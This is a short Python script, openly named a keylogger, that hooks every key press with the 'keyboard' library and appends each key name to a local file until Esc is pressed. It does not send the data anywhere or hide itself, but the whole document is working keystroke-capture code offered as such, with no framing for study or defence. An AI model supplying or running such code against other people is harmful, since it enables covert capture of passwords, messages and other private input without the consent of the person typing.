import keyboard
import time
from datetime import datetime

# File to store the logged keys
log_file = "keylog.txt"

def on_press(event):
    with open(log_file, "a") as f:
        f.write(f"{event.name}\n")

def start_keylogger():
    print("Keylogger started. Press 'esc' to stop.")
    keyboard.on_press(on_press)
    keyboard.wait('esc')

if __name__ == "__main__":
    start_keylogger()
    print("Keylogger stopped.")
